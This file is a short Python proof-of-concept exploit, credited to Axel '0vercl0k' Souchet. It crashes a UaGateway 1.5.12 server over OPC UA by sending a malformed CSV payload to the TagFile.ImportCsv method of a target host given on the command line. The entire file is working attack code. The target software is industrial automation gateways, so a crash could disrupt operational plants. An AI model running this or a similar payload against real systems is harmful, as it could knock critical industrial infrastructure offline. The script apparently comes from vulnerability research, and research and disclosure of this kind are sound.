# Axel '0vercl0k' Souchet - February 6 2023
import argparse
import asyncio
from asyncua import ua
from asyncua import Client

async def trigger(target, port):
    client = Client(url = f'opc.tcp://{target}:{port}')
    await client.connect()
    node = client.get_node('ns=1;s=TagFile.MethodSet')
    trigger = b'''<NamespaceIndex>;<NamespaceUri>
0;http://unifiedautomation.com/TagFile/
<NodeClass>;<Level>;<Name>;<TypeDef>;<Protocol>;<Address>;<AccessLevel>
V;1;;;;UInt32.1.4={'88',','77'66','55'};R'''
    await node.call_method(
        ua.NodeId.from_string('ns=1;s=TagFile.ImportCsv'),
        ua.Variant(trigger, ua.VariantType.ByteString)
    )

def main():
    parser = argparse.ArgumentParser("UaGateway 1.5.12 Remote DoS by Axel '0vercl0k' Souchet of https://doar-e.github.io/")
    parser.add_argument('--port', type = int, default = 48050)
    parser.add_argument('--target', type = str, required = True)
    args = parser.parse_args()
    print('Launching against', args.target)
    asyncio.run(trigger(args.target, args.port))
    print('Done')

if __name__ == '__main__':
    main()